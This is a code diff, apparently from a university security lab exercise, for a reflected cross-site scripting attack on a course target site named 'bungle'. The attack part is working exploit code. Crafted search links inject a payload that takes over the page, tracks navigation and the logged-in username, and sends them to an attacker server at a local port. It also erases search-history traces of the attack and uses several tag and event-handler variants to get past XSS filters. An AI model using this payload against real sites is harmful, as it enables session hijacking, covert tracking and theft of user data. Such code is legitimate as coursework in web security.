@@ -9,7 +9,8 @@ function payload(attacker) { //-
 
 	// Log the things and send them to our spy server
 	function log(data) {
-		console.log($.param(data)) // BE SURE TO LEAVE THIS OUT WHEN SUBMITTING
+		//console.log($.param(data)) 
+		// BE SURE TO LEAVE THIS OUT WHEN SUBMITTING
 		$.get(attacker, data);
 	}
 
@@ -17,15 +18,15 @@ function payload(attacker) { //-
 	function proxy_search(href) {
 		$("html").load(href, function(){
 			$("html").show();
-			if ($('#logged-in-user').length) {
-				log({event: "nav", user: $('#logged-in-user').text(), url: href});
+			if ($("#logged-in-user").length) {
+				log({event: "nav", user: $("#logged-in-user").text(), url: href});
 			}
 			else {
 				log({event: "nav", url: href});
 			}
 
 			// Get rid of all and any search histories relating to XSS
-			$("a[href|='search?q=%3Cscript%3Efunction%20payload%28attacker%29%20%7B%20//']").remove();
+			$("a[href*=\"search?q=%3C\"]").remove();
 
 			// Set up all possible redirects
 			$("#bungle-lnk").on( "click", function() {
@@ -38,14 +39,14 @@ function payload(attacker) { //-
 				return false;
 			});
 
-			$("a[href*='search?q=']").on( "click", function() {
+			$("a[href*=\"search?q=\"]").on( "click", function() {
 				proxy_search(this.href);
 				return false;
 			});
 
 			$("#log-out-btn").on( "click", function() {
 				$.post("http://bungle-cs461.csl.illinois.edu/logout", function(data) {
-					log({event: "logout", user: $('#logged-in-user').text()});
+					log({event: "logout", user: $("#logged-in-user").text()});
 					proxy("./");
 				});
 				return false;
@@ -57,8 +58,8 @@ function payload(attacker) { //-
 	function proxy(href) {
 		$("html").load(href, function(){
 			$("html").show();
-			if ($('#logged-in-user').length) {
-				log({event: "nav", user: $('#logged-in-user').text(), url: href});
+			if ($("#logged-in-user").length) {
+				log({event: "nav", user: $("#logged-in-user").text(), url: href});
 			}
 			else {
 				log({event: "nav", url: href});
@@ -85,7 +86,7 @@ function payload(attacker) { //-
 
 			$("#log-out-btn").on( "click", function() {
 				$.post("http://bungle-cs461.csl.illinois.edu/logout", function(data) {
-					log({event: "logout", user: $('#logged-in-user').text()});
+					log({event: "logout", user: $("#logged-in-user").text()});
 					proxy("./");
 				});
 				return false;
@@ -118,12 +119,10 @@ function makeLink(xssdefense, target, attacker) {
 			";payload(\"" + attacker + "\");</sscriptcript" + ">");
 	} else if(xssdefense == 2) {
 		// Use body instead of script
-		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<image" + " onload=\"" + payload.toString() + ";payload(\"" + attacker + "\");\"></image" + ">");
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<body" + " onload=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'" + "></body" + ">");
 	} else if(xssdefense == 3) {
 		// Use iframe instead of body or script
-		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-			encodeURIComponent("<iframe" + " onload=\'" + payload.toString() +
-			";payload(\"" + attacker + "\");\''>\</iframe" + ">");
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<iframe" + " onload=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'" + "></iframe" + ">");
 	} else if(xssdefense == 4) {
 		// Implement code to defeat XSS defenses here.
 		var payload2 = payload.toString() + ";payload(\""+attacker+"\");";
@@ -138,7 +137,7 @@ function makeLink(xssdefense, target, attacker) {
 	}
 }
 
-var xssdefense = 2;
+var xssdefense = 0;
 var target = "http://bungle-cs461.csl.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 
